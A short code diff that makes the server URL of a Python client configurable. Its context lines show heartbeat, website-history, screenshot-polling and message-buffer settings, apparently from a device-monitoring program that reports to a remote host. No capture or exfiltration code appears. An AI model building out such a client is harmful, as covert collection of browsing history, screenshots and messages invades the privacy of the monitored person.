@@ -1,6 +1,7 @@
 import os
 import time
 import json
+import argparse
 import atexit
 import base64
 import gzip
@@ -41,7 +42,11 @@ HEARTBEAT_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-SITE_URL = "https://pissoff.onrender.com"
+
+parser = argparse.ArgumentParser(add_help=False)
+parser.add_argument("--site-url", default=os.getenv("SITE_URL", "https://pissoff.onrender.com"))
+args, _ = parser.parse_known_args()
+SITE_URL = args.site_url.strip().rstrip("/")
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
 message_buffer = ""
